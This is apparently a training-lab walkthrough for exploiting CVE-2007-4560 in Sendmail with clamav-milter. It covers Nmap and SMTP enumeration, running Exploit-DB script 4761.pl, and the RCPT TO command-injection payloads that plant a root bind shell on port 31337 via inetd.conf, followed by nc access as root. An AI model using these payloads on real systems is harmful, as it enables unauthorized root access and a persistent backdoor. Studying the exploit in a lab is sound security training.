Summary

This lab demonstrates the exploitation of a remote code execution vulnerability in Sendmail configured with clamav-milter in black-hole mode. Learners will use a public exploit to open a bind shell on the target server, granting root access. This exercise focuses on service enumeration, exploitation of vulnerable configurations, and post-exploitation techniques.

Learning Objectives

After completion of this lab, learners will be able to:

Enumerate open ports and services using Nmap and SNMP-based tools.
Identify the ClamAV clamav-milter configuration through service enumeration.
Use the provided Perl exploit to exploit the Sendmail remote command execution vulnerability.
Verify successful exploitation by connecting to the bind shell as root.
Understand the risks of misconfigured email services in production environments.

# Lab Walkthrough: Sendmail with clamav-milter RCE Exploitation (CVE-2007-4560)

## Objective
Exploit a remote command execution vulnerability in Sendmail configured with clamav-milter in black-hole mode to gain root access via a bind shell.

---

## Step 1: Initial Enumeration

First, verify connectivity to the target:

```bash
ping 192.168.243.42
```

Run a comprehensive Nmap scan to identify open ports and services:

```bash
sudo nmap -sSCV -oA clamAV_nmap -T4 192.168.243.42
```

**Key findings:**
- Port 25/tcp - Sendmail 8.13.4/8.13.4/Debian-3sarge3
- Port 80/tcp - Apache httpd 1.3.33
- Port 139/445 - Samba smbd 3.0.14a-Debian

---

## Step 2: SMTP Enumeration

Enumerate SMTP users using VRFY and EXPN commands:

```bash
telnet 192.168.243.42 25
```

Once connected, issue these commands:
```
HELO 192.168.243.42
VRFY root
VRFY postmaster
EXPN root
```

This confirms valid users exist on the system.

Check if the server is an open relay:

```bash
nmap --script smtp-open-relay -p25 192.168.243.42
```

The server responds as an open relay (13/16 tests passed).

Verify clamav-milter ports (closed, but the vulnerability exists in the mail processing chain):

```bash
nmap -p 10025,3310,7357 192.168.243.42
```

---

## Step 3: Locate the Exploit

Search for the clamav-milter exploit:

```bash
searchsploit clamav milter
```

The relevant exploit is: **Sendmail with clamav-milter < 0.91.2 - Remote Command Execution** (Exploit-DB ID: 4761, CVE-2007-4560)

Copy the exploit to your working directory:

```bash
sudo cp /usr/share/exploitdb/exploits/multiple/remote/4761.pl .
sudo chown kali:kali 4761.pl
chmod +x 4761.pl
```

---

## Step 4: Exploitation

Run the exploit against the target:

```bash
perl 4761.pl 192.168.243.42
```

**What the exploit does:**
1. Connects to SMTP port 25
2. Injects commands via the `RCPT TO` SMTP command field
3. Appends a bind shell entry to `/etc/inetd.conf`:
   - `echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf`
4. Restarts inetd: `/etc/init.d/inetd restart`

**Successful output:**
```
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
250 2.0.0 63KDSkuN004147 Message accepted for delivery
```

Verify the bind shell port is now open:

```bash
nmap -p31337 -sS 192.168.243.42
```

Output shows: `31337/tcp open Elite`

---

## Step 5: Access the Root Shell

Connect to the bind shell:

```bash
nc 192.168.243.42 31337
```

Once connected, verify root access:

```bash
id
whoami
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
root
```

Retrieve the proof flag:

```bash
cat /root/proof.txt
```

**Flag:** `f4304ef8fcb9621c76f90df6540c1cfc`

---

## Vulnerability Explanation

**CVE-2007-4560:** When clamav-milter runs in black-hole mode, it fails to sanitize shell metacharacters in the recipient address before passing them to `popen()`. Since Sendmail runs as root, commands injected via the `RCPT TO` SMTP command execute with root privileges.

**Why manual injection attempts failed:** The vulnerability requires the email to be processed by clamav-milter. The public exploit constructs the payload correctly to ensure milter processing occurs, whereas manual attempts using backticks in the Subject line or MIME boundaries did not trigger the vulnerable code path.

---

## Post-Exploitation Commands

```bash
# Verify shell access
id
whoami

# Explore the system
ls -la /root
cat /root/proof.txt

# Check inetd configuration to see the backdoor
cat /etc/inetd.conf | grep 31337
```

---

## Key Takeaways

1. **Service enumeration** identifies potentially vulnerable software versions
2. **SMTP VRFY/EXPN** reveals valid system users
3. **Open relay detection** suggests further email-based attacks are possible
4. **CVE research** leads to existing public exploits
5. **Command injection** can occur in unexpected SMTP fields like `RCPT TO`
6. **Bind shells** provide persistent access when reverse shells fail
7. **Public exploits** may require permission adjustments before execution
